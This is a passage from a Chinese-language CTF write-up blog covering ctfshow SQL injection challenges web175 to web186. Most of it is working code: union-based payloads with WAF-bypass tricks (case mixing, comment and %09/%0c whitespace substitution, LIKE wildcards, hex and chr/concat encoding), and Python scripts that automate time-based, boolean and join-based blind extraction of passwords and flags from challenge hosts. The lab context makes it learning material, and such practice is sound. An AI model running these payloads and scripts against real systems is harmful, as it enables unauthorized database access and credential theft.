class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) //<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">f&#x27;&#x27;&#x27;1&#x27; and 1=if(ascii(substr((select password from ctfshow_user5 limit 24,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(5),0)--+&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(url+<span class="string">&quot;?id=&quot;</span>+payload)</span><br><span class="line">        request_time = time.time() - start_time</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request_time &gt;= DELAY_THRESHOLD:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Delay triggered! ASCII &gt; <span class="subst">&#123;mid&#125;</span>&quot;</span>)</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;No delay. ASCII &lt;= <span class="subst">&#123;mid&#125;</span>&quot;</span>)</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>没关打印，给自己看跑的过程也还不错，因为时间还真是挺久的，这里说一个小点，有时候<code>sleep(5)</code>网站并不一定会休眠5秒，所以要看，而且避免网络波动导致的原因，最好是把时间弄长点</p>
<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>大小写绕过</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union sElect 1,2,group_concat(password) from ctfshow_user--+</span></span><br></pre></td></tr></table></figure>

<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p><code>/**/</code>绕过空格</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;/**/union/**/select/**/1,2,password/**/from/**/ctfshow_user/**/where/**/username=&#x27;</span>flag<span class="string">&#x27;%23</span></span><br></pre></td></tr></table></figure>

<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p><code>%09</code>绕过空格</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;%09union%09select%091,2,password%09from%09ctfshow_user%23</span></span><br></pre></td></tr></table></figure>

<h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><p><code>%0c</code>绕过空格</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23</span></span><br></pre></td></tr></table></figure>

<h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>这里不是很好猜了，写了一个脚本来进行fuzz出waf</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">target = re.<span class="built_in">compile</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">url=<span class="string">&quot;http://638fd489-36ef-4f5d-91bb-aad72adb099c.challenge.ctf.show/api&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repisTrue</span>(<span class="params">char</span>):</span><br><span class="line">    payload=<span class="string">f&#x27;&#x27;&#x27;1&#x27;and&#x27;<span class="subst">&#123;char&#125;</span>&#x27;=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;&#x27;&#x27;</span></span><br><span class="line">    r = requests.get(url+<span class="string">&quot;?id=&quot;</span>+payload)</span><br><span class="line">    w = target.search(r.text)</span><br><span class="line">    <span class="keyword">if</span> w <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    right = []</span><br><span class="line">    waf = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> repisTrue(<span class="built_in">chr</span>(i)):</span><br><span class="line">            right.append((i, <span class="built_in">chr</span>(i)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            waf.append((i, <span class="built_in">chr</span>(i)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;right:&quot;</span>, right)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;waf:&quot;</span>, waf)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;%0cuniOn%0cselEct%0c&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span><span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;%0cuniOn%0cselEct%0c&#x27;</span><span class="number">1</span><span class="string">&#x27;,database(),&#x27;</span><span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;%0cuniOn%0cselEct%0c1,(select%0cgroup_concat(table_name)%0cfrom%0cinformation_schema.tables%0cwhere%0ctable_schema=database()),&#x27;</span><span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;%0cuniOn%0cselEct%0c1,(select%0cgroup_concat(column_name)%0cfrom%0cinformation_schema.columns%0cwhere%0ctable_schema=database()%0cand%0ctable_name=&#x27;</span>ctfshow_user<span class="string">&#x27;),&#x27;</span><span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;%0cuniOn%0cselEct%0c1,(select%0cgroup_concat(password)%0cfrom%0cctfshow_user%0c),&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure>

<h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>优先级</th>
<th>运算符</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><code>:=</code></td>
</tr>
<tr>
<td>2</td>
<td>||\OR\XOR</td>
</tr>
<tr>
<td>3</td>
<td><code>&amp;&amp;</code>, <code>AND</code></td>
</tr>
<tr>
<td>4</td>
<td><code>NOT</code></td>
</tr>
<tr>
<td>5</td>
<td><code>BETWEEN</code>, <code>CASE</code>, <code>WHEN</code>, <code>THEN</code>, <code>ELSE</code></td>
</tr>
<tr>
<td>6</td>
<td><code>=</code>, <code>&lt;=&gt;</code>, <code>&gt;=</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&lt;</code>, <code>&lt;&gt;</code>, <code>!=</code>, <code>IS</code>, <code>LIKE</code>, <code>REGEXP</code>, <code>IN</code></td>
</tr>
<tr>
<td>7</td>
<td>|</td>
</tr>
<tr>
<td>8</td>
<td><code>&amp;</code></td>
</tr>
<tr>
<td>9</td>
<td><code>&lt;&lt;</code>, <code>&gt;&gt;</code></td>
</tr>
<tr>
<td>10</td>
<td><code>-</code>, <code>+</code></td>
</tr>
<tr>
<td>11</td>
<td><code>*</code>, <code>/</code>, <code>DIV</code>, <code>%</code>, <code>MOD</code></td>
</tr>
<tr>
<td>12</td>
<td><code>^</code></td>
</tr>
<tr>
<td>13</td>
<td><code>-</code> (一元减号), <code>~</code> (一元比特反转)</td>
</tr>
<tr>
<td>14</td>
<td><code>!</code></td>
</tr>
<tr>
<td>15</td>
<td><code>BINARY</code>, <code>COLLATE</code></td>
</tr>
</tbody></table>
<blockquote>
<p>注：数字越小，优先级越低；数字越大，优先级越高。MySQL中的运算符优先级从低到高排列。</p>
</blockquote>
<p>这里很容易看出来我们直接插入<code>username</code>为<code>flag</code>即可获得flag，</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> ctfshow_user <span class="keyword">where</span> username <span class="operator">!=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">&#x27;-1&#x27;</span><span class="operator">||</span>username<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>说实话我没有看太懂，然后在我们SU的discord里面问了问</p>
<p><img src="/../images/achieve/2025/4/ctfshowSql%E6%B3%A8%E5%85%A5/QQ20250430-092023.jpg" alt="1"></p>
<p>就是这个样子，输入<code>-1&#39;||username=&#39;flag</code></p>
<h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><p>过滤了flag利用通配符</p>
<p><code>-1&#39;||(username)like&#39;fla_</code>或者是<code>-1&#39;||(username)like&#39;fla%</code></p>
<table>
<thead>
<tr>
<th>通配符</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>%</code></td>
<td>匹配零个或多个任意字符</td>
<td><code>&#39;a%&#39;</code> 匹配所有以a开头的字符串</td>
</tr>
<tr>
<td><code>_</code></td>
<td>匹配单个任意字符</td>
<td><code>&#39;a_&#39;</code> 匹配所有以a开头的两个字符长度的字符串</td>
</tr>
</tbody></table>
<p>如果需要匹配通配符字符本身（即匹配 <code>%</code> 或 <code>_</code> 字符），可以使用转义符 <code>\</code> 进行转义：</p>
<table>
<thead>
<tr>
<th>模式</th>
<th>说明</th>
<th>匹配示例</th>
<th>不匹配示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>&#39;10\%&#39;</code></td>
<td>匹配字符串”10%”</td>
<td>‘10%’</td>
<td>‘10’, ‘100%’</td>
</tr>
<tr>
<td><code>&#39;\_apple&#39;</code></td>
<td>匹配字符串”_apple”</td>
<td>‘_apple’</td>
<td>‘apple’, ‘a_apple’</td>
</tr>
</tbody></table>
<h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>利用通配符来匹配</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(pass) <span class="keyword">from</span> (ctfshow_user)<span class="keyword">where</span>(pass)<span class="keyword">like</span><span class="string">&#x27;&#123;target+s&#125;%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>查出来只有一条数据，也就是回显为<code>$user_count = 1;</code>，开始盲注</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://f8df49db-5bb2-442e-8ce6-43929bc95b90.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">strings=<span class="string">&quot;1234567890abcdef-&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">target=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">        payload=<span class="string">f&quot;(ctfshow_user)where(pass)like&#x27;<span class="subst">&#123;target+s&#125;</span>%&#x27;&quot;</span></span><br><span class="line">        data=&#123;<span class="string">&quot;tableName&quot;</span>:payload&#125;</span><br><span class="line">        r=requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target+=s</span><br><span class="line">            <span class="built_in">print</span>(target)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> s ==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>

<h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><p>利用<code>group by</code>对查询结果进行分组，再来筛选，写个脚本</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ctfshow_user <span class="keyword">group</span> <span class="keyword">by</span> pass <span class="keyword">having</span> pass <span class="keyword">like</span> <span class="number">0x63746673686f777b25</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://99243179-d071-4d4e-8e0a-8bb4c0177aa9.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">target = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&quot;ctfshow_user group by pass having pass like 0x&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(str_to_hex(target + j + <span class="string">&#x27;%&#x27;</span>))</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;tableName&#x27;</span>: payload&#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 1;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target += j</span><br><span class="line">            <span class="built_in">print</span>(target)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(target) == <span class="number">44</span>:</span><br><span class="line">            <span class="built_in">print</span>(target + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">            exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也可以利用内连接\左连接\右连接</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ctfshow_user a <span class="keyword">inner</span> <span class="keyword">join</span> ctfshow_user b <span class="keyword">on</span> b.pass <span class="keyword">like</span> <span class="number">0x63746673686f777b25</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ctfshow_user a <span class="keyword">right</span> <span class="keyword">join</span> ctfshow_user b <span class="keyword">on</span> b.pass <span class="keyword">like</span> <span class="number">0x63746673686f777b25</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> ctfshow_user a <span class="keyword">left</span> <span class="keyword">join</span> ctfshow_user b <span class="keyword">on</span> b.pass <span class="keyword">like</span> <span class="number">0x63746673686f777b25</span>;</span><br></pre></td></tr></table></figure>

<p>写出三个脚本(练习为主)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://99243179-d071-4d4e-8e0a-8bb4c0177aa9.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">target = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&quot;ctfshow_user a inner join ctfshow_user b on b.pass like 0x&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(str_to_hex(target + j + <span class="string">&#x27;%&#x27;</span>))</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;tableName&#x27;</span>: payload&#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 22;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target += j</span><br><span class="line">            <span class="built_in">print</span>(target)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(target) == <span class="number">44</span>:</span><br><span class="line">            <span class="built_in">print</span>(target + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">            exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://99243179-d071-4d4e-8e0a-8bb4c0177aa9.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line">target = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&#x27;</span>:</span><br><span class="line">        payload = <span class="string">&quot;ctfshow_user a right join ctfshow_user b on b.pass like 0x&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(str_to_hex(target + j + <span class="string">&#x27;%&#x27;</span>))</span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;tableName&#x27;</span>: payload&#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 43;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target += j</span><br><span class="line">            <span class="built_in">print</span>(target)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(target) == <span class="number">44</span>:</span><br><span class="line">            <span class="built_in">print</span>(target + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">            exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>为什么我没写左链接的脚本，因为我发现怎么写，他的回显都是一样的，没有区别无法完成盲注的任务，原因是什么呢？</p>
<ul>
<li>LEFT JOIN 实现了一个左表保留的操作，确保左表中的每一行至少出现在结果集中一次，无论右表中是否存在匹配行。如果没有找到匹配行，SQL 会用 NULL 值填充右表的列。GeeksforGeek +2 这种做法创建了一个可预测的基础，<strong>该基础在任何连接条件下都保持不变。</strong></li>
<li>相比之下，INNER JOIN 执行交集操作，结果集的大小会根据两个表之间实际匹配的数量而大幅变化。在 postgresql 中，结果集可以是零行（没有匹配）到笛卡尔积（每行多个匹配）。RIGHT JOIN 的行为类似于 LEFT JOIN，但在自连接场景中使用时会保留右表，从而在使用时产生类似的可变性。</li>
</ul>
<h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><p>这题就比较复杂了，需要自增出true来表示数字，再利用<code>chr</code>和<code>concat</code>来表示字符串，不过注入还是用的<code>group by</code>和<code>like</code>通配符来打的，写个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://50a0761d-8695-48df-bfe5-9410e5169332.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;ctfshow_user group by pass having pass like(concat(&#123;&#125;))&#x27;</span></span><br><span class="line">target = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createNum</span>(<span class="params">n</span>):</span><br><span class="line">    num = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            num += <span class="string">&quot;+true&quot;</span></span><br><span class="line">        <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createStrNum</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">str</span> += <span class="string">&#x27;chr(&#x27;</span> + createNum(<span class="built_in">ord</span>(c[<span class="number">0</span>])) + <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c[<span class="number">1</span>:]:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&#x27;,chr(&#x27;</span> + createNum(<span class="built_in">ord</span>(i)) + <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uuid = string.ascii_lowercase + string.digits + <span class="string">&quot;-&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> uuid:</span><br><span class="line">        poc = payload.<span class="built_in">format</span>(createStrNum(target + j + <span class="string">&quot;%&quot;</span>))</span><br><span class="line">        <span class="comment"># print(poc)</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: poc</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 0;&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            target += j</span><br><span class="line">            <span class="built_in">print</span>(target)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h2><p>内连接，绕过还是一样绕</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 